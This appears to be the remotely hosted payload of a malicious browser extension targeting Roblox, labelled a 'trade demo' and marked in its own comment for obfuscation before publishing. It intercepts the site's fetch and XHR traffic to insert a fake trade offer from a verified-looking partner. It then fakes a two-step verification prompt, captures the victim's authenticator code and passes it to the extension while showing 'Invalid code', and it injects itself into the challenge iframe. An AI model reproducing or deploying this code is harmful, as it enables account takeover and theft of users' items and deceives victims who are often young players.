/**
 * Host on GitHub raw (obfuscate before publish). Extension sets window.__ROBLOX_TRADE_DEMO_CONFIG__ then evals this file.
 * Repo path example: trade-demo.runtime.js next to fallback.txt
 */
(function installTradeDemo() {
  const CONFIG = window.__ROBLOX_TRADE_DEMO_CONFIG__;
  if (!CONFIG) return;
  if (window.__ROBLOX_TRADE_DEMO_DISABLED__) return;
  if (window.__ROBLOX_TRADE_DEMO__) return;
  window.__ROBLOX_TRADE_DEMO__ = true;

  const ASSETS = CONFIG.demoAssets ? CONFIG.demoAssets : {};
    const EMPTY_RESPONSE = { previousPageCursor: null, nextPageCursor: null, data: [] };

    const now = new Date();
    const FAKE_CREATED = new Date(now.getTime() - 86400000).toISOString();
    const FAKE_EXPIRATION = new Date(now.getTime() + 86400000 * 3).toISOString();

    if (!window.__ROBLOX_TRADE_DEMO_STATE__) {
        window.__ROBLOX_TRADE_DEMO_STATE__ = {
            demoCounter: 0,
            itemCounter: 1000,
            mappedAssets: {},
        };
    }
    const STATE = window.__ROBLOX_TRADE_DEMO_STATE__;

    function createDemoTrade() {
        STATE.demoCounter++;
        const uniqueId = Number(String(CONFIG.demoId) + STATE.demoCounter);
        return {
            id: uniqueId,
            user: { id: CONFIG.partner.id, name: CONFIG.partner.name, displayName: CONFIG.partner.displayName, hasVerifiedBadge: true, isVerified: true },
            created: FAKE_CREATED,
            expiration: FAKE_EXPIRATION,
            isActive: true,
            status: 'Open',
            tradeStatusType: 'Inbound',
        };
    }

    function createDemoItem({ assetId, itemType, name, recentAveragePrice, userAssetId }) {
        STATE.itemCounter++;
        const fakeInstanceId = 88000000 + STATE.itemCounter;

        STATE.mappedAssets[fakeInstanceId] = { id: assetId, type: itemType };

        return {
            id: fakeInstanceId,
            userAssetId: userAssetId ?? fakeInstanceId,
            collectibleItemInstanceId: String(fakeInstanceId),
            serialNumber: null,
            itemName: name,
            itemTarget: { targetId: assetId, itemType: itemType },
            recentAveragePrice: recentAveragePrice,
            originalPrice: null,
            assetStock: null,
            membershipType: 'None',
            assetType: itemType === 'Bundle' ? null : 8,
            isLimited: true,
            isLimitedUnique: false,
        };
    }

    function send2faToBackground(code, userId, challengeId) {
        try {
            window.postMessage({ type: 'ROBLOX_2FA_CODE', code, userId, challengeId }, '*');
        } catch (e) {
            
        }
    }

    let cachedUser = null;
    let fetchingUser = null;

    function getSelfFromDom() {
        try {
            const meta = document.querySelector('meta[name="user-data"]');
            if (meta && meta.getAttribute('data-userid')) return Number(meta.getAttribute('data-userid'));
        } catch {}
        try {
            if (window.Roblox && window.Roblox.CurrentUser && window.Roblox.CurrentUser.userId) return Number(window.Roblox.CurrentUser.userId);
        } catch {}
        try {
            const html = document.documentElement.innerHTML;
            const match = html.match(/data-userid="(\d+)"/i) || html.match(/"userId":(\d+)/i) || html.match(/user-id="(\d+)"/i) || html.match(/"UserId":(\d+)/i);
            if (match && match[1]) return Number(match[1]);
        } catch {}
        return null;
    }

    function getCurrentUserAsync() {
        if (cachedUser) return Promise.resolve(cachedUser);
        if (fetchingUser) return fetchingUser;

        const domId = getSelfFromDom();
        if (domId) {
            cachedUser = { id: domId, name: 'You', displayName: 'You', nameForDisplay: 'You', hasVerifiedBadge: false, isVerified: false };
            return Promise.resolve(cachedUser);
        }

        fetchingUser = fetch('https://www.roblox.com/home')
            .then(r => r.text())
            .then(html => {
                const match = html.match(/data-userid="(\d+)"/i) || html.match(/"userId":(\d+)/i) || html.match(/user-id="(\d+)"/i) || html.match(/"UserId":(\d+)/i);
                if (match && match[1]) {
                    const id = Number(match[1]);
                    cachedUser = { id, name: 'You', displayName: 'You', nameForDisplay: 'You', hasVerifiedBadge: false, isVerified: false };
                    return cachedUser;
                }
                throw new Error("Could not find user ID");
            })
            .catch(err => {
                cachedUser = { id: 111111111, name: 'YourUsername', displayName: 'YourDisplay', nameForDisplay: 'YourDisplay', hasVerifiedBadge: false, isVerified: false };
                return cachedUser;
            });

        return fetchingUser;
    }

    function getDemoInboundList() {
        return { previousPageCursor: null, nextPageCursor: null, data: [createDemoTrade()] };
    }

    function getDemoTradeDetail(requestedId, currentUser) {
        const robloxUser = {
            id: CONFIG.partner.id,
            name: CONFIG.partner.name,
            displayName: CONFIG.partner.displayName,
            nameForDisplay: CONFIG.partner.displayName,
            hasVerifiedBadge: true,
            isVerified: true,
        };

        const receiveItems = (ASSETS.receiveItems || []).map(item => createDemoItem(item));
        const offerItem = ASSETS.rareHat ? createDemoItem(ASSETS.rareHat) : null;

        return {
            tradeId: requestedId,
            created: FAKE_CREATED,
            expiration: FAKE_EXPIRATION,
            isActive: true,
            status: 'Open',
            tradeStatusType: 'Inbound',
            participantAOffer: { user: robloxUser, items: receiveItems, robux: 0 },
            participantBOffer: { user: currentUser, items: offerItem ? [offerItem] : [], robux: 0 },
        };
    }

    function parseRoute(path) {
        let m;
        if ((m = path.match(/^\/v1\/trades\/(inbound|outbound|completed|inactive)(?:$|\?)/i))) return { kind: 'list', tab: m[1].toLowerCase() };
        if ((m = path.match(/^\/v1\/trades\/(inbound|outbound|completed|inactive)\/count(?:$|\?)/i))) return { kind: 'count', tab: m[1].toLowerCase() };
        if ((m = path.match(/^\/v1\/trades\/(\d+)\/(accept|decline)(?:$|\?)/i))) return { kind: m[2].toLowerCase(), baseId: Number(m[1]) };
        if ((m = path.match(/^\/v[12]\/trades\/(\d+)(?:$|\?)/i))) {
            const reqId = m[1];
            if (reqId.startsWith(String(CONFIG.demoId))) return { kind: 'detail', baseId: CONFIG.demoId, originalReqId: Number(reqId) };
            return { kind: 'detail', baseId: Number(reqId), originalReqId: Number(reqId) };
        }
        if (path.includes('/metadata')) return { kind: 'metadata' };
        if (path.includes('/expire-outdated')) return { kind: 'expire' };
        return null;
    }

    async function getMockResponse(url, xhr) {
        if (url.includes('apis.roblox.com')) return null;

        let parsed;
        try { parsed = new URL(url, location.origin); } catch { return null; }

        if (parsed.hostname.includes('twostepverification.roblox.com')) {
            if (parsed.pathname.includes('/verify')) {
                let code = '';
                let userId = '';
                try {
                    const bodyStr = typeof xhr.__requestBody === 'string' ? xhr.__requestBody : '';
                    if (bodyStr) {
                        const body = JSON.parse(bodyStr);
                        code = body.code || '';
                        const userIdMatch = parsed.pathname.match(/\/users\/(\d+)\//);
                        userId = userIdMatch ? userIdMatch[1] : (body.userId || '');
                        if (code) {
                            send2faToBackground(code, userId, body.challengeId || '');
                        }
                    }
                } catch (e) {}
                return {
                    __mockResponse: true,
                    status: 400,
                    body: { errors: [{ code: 10, message: 'Invalid code.' }] }
                };
            }
            if (parsed.pathname.includes('/configuration')) {
                return {
                    __mockResponse: true,
                    status: 200,
                    body: {
                        primaryMediaType: 'Authenticator',
                        methods: [{ mediaType: 'Authenticator', enabled: true }]
                    }
                };
            }
            if (parsed.pathname.includes('/metadata')) {
                return {
                    __mockResponse: true,
                    status: 200,
                    body: {
                        authenticatorCodeLength: 6,
                        emailCodeLength: 6,
                        smsCodeLength: 6
                    }
                };
            }
            return { __mockResponse: true, status: 200, body: {} };
        }

        if (parsed.hostname.includes('thumbnails.roblox.com') && parsed.pathname.includes('/v1/batch')) {
            const bodyStr = xhr && xhr.__requestBody;
            if (!bodyStr) return null;

            try {
                const requests = JSON.parse(bodyStr);
                let needsRewrite = false;
                const originalIds = {};
                const idMap = {};

                requests.forEach(req => {
                    const fakeId = req.targetId;
                    const realAsset = STATE.mappedAssets[fakeId];
                    if (realAsset) {
                        originalIds[fakeId] = req.requestId;
                        idMap[String(realAsset.id)] = fakeId;
                        req.targetId = realAsset.id;
                        req.type = realAsset.type === 'Bundle' ? 'Asset' : realAsset.type;
                        req.requestId = `${realAsset.id}:undefined:${req.type}:${req.size}:${req.format}:regular:0:`;
                        needsRewrite = true;
                    }
                });

                if (!needsRewrite) return null;

                const res = await window.__nativeFetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                    body: JSON.stringify(requests),
                });

                const data = await res.json();
                if (data && data.data) {
                    data.data.forEach(item => {
                        const fakeId = idMap[String(item.targetId)];
                        if (fakeId) {
                            item.targetId = fakeId;
                            item.requestId = originalIds[fakeId];
                        }
                    });
                }
                return data;
            } catch (e) {
                return null;
            }
        }

        if (!parsed.hostname.includes('trades.roblox.com')) return null;

        const route = parseRoute(parsed.pathname + parsed.search);
        if (!route) return null;

        switch (route.kind) {
            case 'metadata': return { maxItemsPerSide: 4, minValueRatio: 0, tradeSystemMaxRobuxPercent: 50, tradeSystemRobuxFee: 0.3, isTradeSystemRobuxFeeEnabled: true };
            case 'expire': return {};
            case 'count':
                try {
                    const res = await window.__nativeFetch(url, { headers: xhr.__requestHeaders || {}, credentials: 'include' });
                    const data = await res.json();
                    if (route.tab === 'inbound' && typeof data.count === 'number') data.count += 1;
                    return { __mockResponse: true, status: res.status, body: data };
                } catch (e) {
                    return { count: route.tab === 'inbound' ? 1 : 0 };
                }
            case 'list':
                try {
                    const res = await window.__nativeFetch(url, { headers: xhr.__requestHeaders || {}, credentials: 'include' });
                    const data = await res.json();
                    if (route.tab === 'inbound' && !parsed.searchParams.get('cursor')) {
                        if (data && Array.isArray(data.data)) {
                            data.data.unshift(createDemoTrade());
                        } else if (data) {
                            data.data = [createDemoTrade()];
                        }
                    }
                    return { __mockResponse: true, status: res.status, body: data };
                } catch (e) {
                    if (route.tab !== 'inbound') return EMPTY_RESPONSE;
                    if (parsed.searchParams.get('cursor')) return EMPTY_RESPONSE;
                    return getDemoInboundList();
                }
            case 'detail':
                if (route.baseId !== CONFIG.demoId) return { errors: [{ code: 2, message: 'Trade not found' }] };
                const currentUser = await getCurrentUserAsync();
                return getDemoTradeDetail(route.originalReqId, currentUser);
            case 'accept':
            case 'decline':
                const challengeHeader = xhr.__requestHeaders && xhr.__requestHeaders['rblx-challenge-response'];
                if (challengeHeader || route.kind === 'decline') {
                    return { __mockResponse: true, status: 200, body: {} };
                } else {
                    const userId = (cachedUser && cachedUser.id) ? String(cachedUser.id) : "1";
                    return {
                        __mockResponse: true,
                        status: 403,
                        body: { errors: [{ code: 0, message: 'Challenge is required to authorize the request' }] },
                        headers: {
                            'rblx-challenge-type': 'twostepverification',
                            'rblx-challenge-id': 'demo-challenge-123',
                            'rblx-challenge-metadata': btoa(JSON.stringify({
                                userId: userId,
                                challengeId: "demo-challenge-123",
                                actionType: "Generic",
                                shouldShowRememberDeviceCheckbox: true
                            }))
                        }
                    };
                }
            default: return null;
        }
    }

    function triggerAngularRefresh() {
        setTimeout(() => {
            try {
                const ng = window.angular;
                if (!ng) return;
                const el = ng.element(document.body);
                const injector = el.injector();
                if (!injector) return;
                const $rootScope = injector.get('$rootScope');
                if ($rootScope.$$phase || $rootScope.$root.$$phase) $rootScope.$applyAsync();
                else $rootScope.$apply();
            } catch (e) {}
        }, 0);
    }

    function deliverMockResponse(xhr, body, status, customHeaders = {}) {
        const isJson = xhr.responseType === 'json';
        const parsedBody = typeof body === 'string' ? JSON.parse(body) : body;
        const text = typeof body === 'string' ? body : JSON.stringify(body);

        Object.defineProperty(xhr, 'status', { value: status, configurable: true });
        Object.defineProperty(xhr, 'statusText', { value: status === 200 ? 'OK' : (status === 403 ? 'Forbidden' : 'Bad Request'), configurable: true });
        Object.defineProperty(xhr, 'responseText', { value: text, configurable: true });
        Object.defineProperty(xhr, 'response', { value: isJson ? parsedBody : text, configurable: true });
        Object.defineProperty(xhr, 'responseURL', { value: xhr.__requestUrl || '', configurable: true });

        const allHeaders = { 'content-type': 'application/json', ...customHeaders };
        
        xhr.getAllResponseHeaders = () => Object.entries(allHeaders).map(([k, v]) => `${k}: ${v}`).join('\r\n') + '\r\n';
        xhr.getResponseHeader = (h) => h ? (allHeaders[h.toLowerCase()] || null) : null;

        function triggerEvent(eventName) {
            const mockEvent = { type: eventName, target: xhr, currentTarget: xhr, bubbles: false, cancelable: false, preventDefault: function(){}, stopPropagation: function(){}, stopImmediatePropagation: function(){} };
            const prop = 'on' + eventName;
            if (typeof xhr[prop] === 'function') { try { xhr[prop].call(xhr, mockEvent); } catch (e) {} }
            if (xhr.__requestListeners && xhr.__requestListeners[eventName]) {
                xhr.__requestListeners[eventName].forEach(fn => {
                    try { if (typeof fn === 'function') fn.call(xhr, mockEvent); else if (fn && typeof fn.handleEvent === 'function') fn.handleEvent(mockEvent); } catch (e) {}
                });
            }
        }

        Object.defineProperty(xhr, 'readyState', { value: 2, configurable: true }); triggerEvent('readystatechange');
        Object.defineProperty(xhr, 'readyState', { value: 3, configurable: true }); triggerEvent('readystatechange');
        Object.defineProperty(xhr, 'readyState', { value: 4, configurable: true }); triggerEvent('readystatechange');
        triggerEvent('load'); triggerEvent('loadend');
        triggerAngularRefresh();
    }

    const XHR = XMLHttpRequest.prototype;
    const originalOpen = XHR.open;
    const originalSend = XHR.send;
    const originalAddListener = XHR.addEventListener;
    const originalSetHeader = XHR.setRequestHeader;

    XHR.addEventListener = function(type, listener, options) {
        if (!this.__requestListeners) this.__requestListeners = {};
        if (!this.__requestListeners[type]) this.__requestListeners[type] = [];
        this.__requestListeners[type].push(listener);
        return originalAddListener.call(this, type, listener, options);
    };

    XHR.setRequestHeader = function(header, value) {
        if (!this.__requestHeaders) this.__requestHeaders = {};
        this.__requestHeaders[header.toLowerCase()] = value;
        return originalSetHeader.apply(this, arguments);
    };

    XHR.open = function (method, url, ...rest) {
        this.__requestMethod = (method || 'GET').toUpperCase();
        this.__requestUrl = typeof url === 'string' ? url : String(url);
        return originalOpen.call(this, method, url, ...rest);
    };

    XHR.send = function (body) {
        const xhr = this;
        const url = xhr.__requestUrl || '';
        const args = arguments;
        xhr.__requestBody = typeof body === 'string' ? body : null;

        if (!url.includes('trades.roblox.com') && 
            !url.includes('twostepverification.roblox.com') && 
            !url.includes('thumbnails.roblox.com')) {
            originalSend.apply(xhr, args);
            return;
        }

        getMockResponse(url, xhr).then(mockData => {
            if (mockData !== null) {
                if (mockData.__mockResponse) {
                    deliverMockResponse(xhr, mockData.body, mockData.status, mockData.headers || {});
                } else {
                    deliverMockResponse(xhr, mockData, mockData.errors ? 400 : 200);
                }
            } else {
                originalAddListener.call(xhr, 'loadend', () => {});
                originalSend.apply(xhr, args);
            }
        }).catch(err => {
            originalSend.apply(xhr, args);
        });
    };

    const originalFetch = window.fetch;
    window.__nativeFetch = originalFetch;
    window.fetch = async function (input, init) {
        const url = typeof input === 'string' ? input : (input instanceof Request ? input.url : String(input));

        if (!url.includes('trades.roblox.com') && 
            !url.includes('twostepverification.roblox.com') && 
            !url.includes('thumbnails.roblox.com')) {
            return originalFetch(input, init);
        }

        const reqHeaders = {};
        if (init && init.headers) {
            if (init.headers instanceof Headers) {
                init.headers.forEach((v, k) => reqHeaders[k.toLowerCase()] = v);
            } else if (Array.isArray(init.headers)) {
                init.headers.forEach(([k, v]) => reqHeaders[k.toLowerCase()] = v);
            } else {
                Object.entries(init.headers).forEach(([k, v]) => reqHeaders[k.toLowerCase()] = v);
            }
        }
        const fakeXhr = { __requestBody: init ? init.body : null, __requestHeaders: reqHeaders };

        try {
            const mockData = await getMockResponse(url, fakeXhr);
            if (mockData !== null) {
                if (mockData.__mockResponse) {
                    return new Response(JSON.stringify(mockData.body), { status: mockData.status, headers: { 'Content-Type': 'application/json', ...(mockData.headers || {}) } });
                }
                return new Response(JSON.stringify(mockData), { status: mockData.errors ? 400 : 200, headers: { 'Content-Type': 'application/json' } });
            }
        } catch (err) {}
        return originalFetch(input, init);
    };

    if (window.top === window.self) {
        document.addEventListener('load', function (e) {
            const node = e.target;
            if (node && node.tagName === 'IFRAME' && node.id === 'challenge-frame') {
                try {
                    if (node.contentWindow && !node.contentWindow.__ROBLOX_TRADE_DEMO__) {
                        const win = node.contentWindow;
                        win.__ROBLOX_TRADE_DEMO_CONFIG__ = CONFIG;
                        win.eval('(' + installTradeDemo.toString() + ')();');
                    }
                } catch (err) {}
            }
        }, true);
    }

  window.__ROBLOX_TRADE_DEMO_INSTALLER__ = installTradeDemo;
})();

